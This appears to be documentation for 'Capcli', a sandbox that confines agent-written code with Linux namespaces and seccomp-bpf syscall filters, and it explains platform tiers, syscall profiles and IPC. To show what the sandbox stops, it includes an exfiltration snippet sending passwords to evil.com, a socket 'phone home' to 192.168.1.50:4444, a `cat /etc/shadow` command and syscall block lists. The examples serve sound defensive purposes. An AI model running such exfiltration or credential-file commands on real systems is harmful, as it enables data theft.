# Sandboxing, Syscalls, & Platform Tiers

Most developers think "sandboxing" means spinning up a 4GB Docker container with an entire Ubuntu image to execute a 12-line Python script. It takes eight seconds to boot, eats your RAM, and still doesn't stop the script from running `requests.post("https://evil.com", data=all_your_passwords)` — Docker leaves outbound networking wide open by default.

Docker isolates the machine. **Capcli isolates the syscalls.**

Capcli spins up sandboxes in under 50 milliseconds using unprivileged Linux namespaces (`bwrap`) and system-call trapping (`seccomp-bpf`). Here is how guest code is physically caged, and how your host gets classified.

---

<a id="tiers"></a>

## 1. Platform Tiers: Tier 1 vs Tier 2

Before executing a single routine, `capcli sys doctor` inspects your host kernel and assigns one of two tiers. This file is the source of truth for the taxonomy.

| | **Tier 1 — Hardened Isolation** | **Tier 2 — Degraded Isolation** |
|---|---|---|
| **Hosts** | Linux bare-metal, VPS, Docker (with userns), WSL2 | macOS, Windows native, Android Termux |
| **Isolation** | Unprivileged namespaces (`bwrap`) + `seccomp-bpf` trapping at the kernel boundary | IPC broker mediation + C authorizer; no kernel-level syscall trapping |
| **Scratch space** | tmpfs ephemeral, wiped on process exit | Broker-mediated |
| **Trust ceiling** | All rungs unlocked: draft, reviewed, **pinned** | Draft and reviewed, in `dev`/`sim` only |
| **Pinned execution** | Allowed | **Refused** — `exit 2` (`E045_TIER2_PINNED_DENIED`); see the [invariant row](../reference/limits.md#invariants) |

A Tier 2 host can be a great laptop and a mediocre jail at the same time. Capcli prices that honestly instead of pretending.

The physics: macOS (Darwin), Windows native, and Termux lack unprivileged user namespaces in the host kernel — `bwrap` cannot run without root, so a local guest process cannot be hardware-caged, and a determined one can bypass user-space network proxies. Tier 2 guests are therefore mediated by the IPC broker and the [authorizer](authorizer.md) instead of trapped by the CPU.

The consequence is simple: write code on any machine, rehearse against `sim` on any machine — but pinned, unattended production execution runs on Linux. The trust mechanics of that ceiling: [trust-engine.md](trust-engine.md).

---

## 2. The Network Jail: Syscall 42 Trapping

When an agent writes code inside a routine, it might get cute and try to open a raw TCP socket:

```python
# Inside routines/sneaky_exfil.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.50", 4444))  # Tries to phone home
```

On Tier 1 hosts, Capcli compiles a **`seccomp-bpf`** filter and attaches it to the guest process before execution starts. The microsecond Python executes `s.connect(...)`, the CPU raises **Syscall 42 (`connect`)** — and the filter kills the process at the processor level:

```
Guest Python Process
        │  invokes syscall 42 (connect)
        ▼
┌───────────────────────┐
│    seccomp-bpf filter │ ──▶  [KILL] process terminated instantly
└───────────────────────┘
        │
        ▼
  exit 2: kernel.network.jail
```

The process never touches the network stack. There is no "connection timeout," no "host unreachable" — the kernel snipes the syscall before it lands. The subshell terminates with `exit 2` (`kernel.network.jail`); the receipt form is documented in [reference/exit-codes.md#exit-2](../reference/exit-codes.md#exit-2).

### How do routines talk to the internet, then?

Through the **`ctx.api.call`** IPC bridge. The guest script asks the Capcli kernel over a local Unix domain socket: *"Please execute the activated catalog verb `stripe.refund_charge` on my behalf."* The kernel inspects the token bucket, checks the budget, validates the schema, injects the vaulted secret, and fires the HTTP request from its own hardened proxy. All egress, no raw sockets.

---

## 3. Dynamic Syscall Profiles per Runtime

Different engines need different syscalls to function. Node needs event loops; Python needs thread futexes. Capcli ships engine-specific `seccomp-bpf` profiles:

| Runtime Profile | Permitted Syscalls | Blocked Syscalls |
|---|---|---|
| **`profile_python`** | `clone`, `futex`, `mmap`, basic POSIX signals | `connect`, `socket`, `bind`, `listen`, `ptrace` |
| **`profile_bun_node`** | `epoll_create1`, `epoll_ctl`, `eventfd2`, `io_uring_setup` | Raw network egress, host filesystem mounts outside `/scratch` |
| **`profile_binary`** | `clone3`, `futex`, `rseq`, `rt_sigreturn` | All network, direct disk writes outside the jail |

If Bun tries to spawn an unwhitelisted child binary, or Python tries to attach a debugger via `ptrace`, the profile triggers an immediate SIGKILL.

---

## 4. The IPC Socket Architecture

How do guest routines talk to the kernel without network access? High-speed, local platform IPC:

```
┌────────────────────────────────────────────────────────────────────────┐
│  SANDBOX JAIL (bwrap / broker)                                         │
│                                                                        │
│   Guest Script (TypeScript / Python)                                   │
│        │                                                               │
│        │ JSON-Lines Protocol (zero-dependency SDK)                     │
│        ▼                                                               │
│   Local Domain Socket Mount                                            │
└────────┬───────────────────────────────────────────────────────────────┘
         │  Streaming JSON-RPC 2.0
         ▼
┌────────────────────────────────────────────────────────────────────────┐
│  CAPCLI KERNEL (Rust Core)                                             │
│  Linux / macOS: /run/capcli/kernel.sock                                │
│  Windows:       \\.\pipe\capcli-kernel                                 │
└────────────────────────────────────────────────────────────────────────┘
```

* **Warm runner recycling:** sandboxes keep pre-warmed runtimes, so a sandboxed Python or Bun execution starts in tens of milliseconds — not the seconds a container takes.
* **Ephemeral `/scratch` tmpfs:** guest code gets an in-memory 64 MB `tmpfs` at `/scratch`. When the script finishes, the namespace dissolves and the scratch disk is wiped from RAM. No residual temporary files survive.

---

## 5. Jailing Ad-Hoc Host Commands: `sys exec --sandbox`

What if your agent needs to run an external CLI tool (`jq`, `pandoc`, `tar`) on a file, and you don't trust it not to delete your home directory?

Wrap it in the jail ([full syntax](../reference/cli/sys.md)):

```bash
$ capcli sys exec "cat /etc/shadow" --sandbox
```

```text
[dev:tier_1]  ✗  exit 1

  cat: /etc/shadow: No such file or directory
```

The command runs, but inside a ghost town — `/etc/shadow` isn't there because the real root filesystem isn't there. The guest command's own exit code propagates; capcli's job was never to fake success, only to contain the blast.

### What `sys exec --sandbox` does

1. Provisions an isolated `bwrap` container.
2. Uses `pivot_root` to unmount your actual root filesystem.
3. Maps your workspace directory as read-only.
4. Mounts an empty `tmpfs` at `/tmp`.
5. Drops all Linux capabilities (`CAP_SYS_ADMIN`, `CAP_NET_RAW`, etc.).

The command can read the input files you gave it, write output to `/scratch`, and do nothing else.

---

**See how audit logs capture sandbox violations:** → [memory-spine.md](memory-spine.md)
**Probe your host's tier right now:** → `capcli sys doctor` ([reference/cli/sys.md](../reference/cli/sys.md))
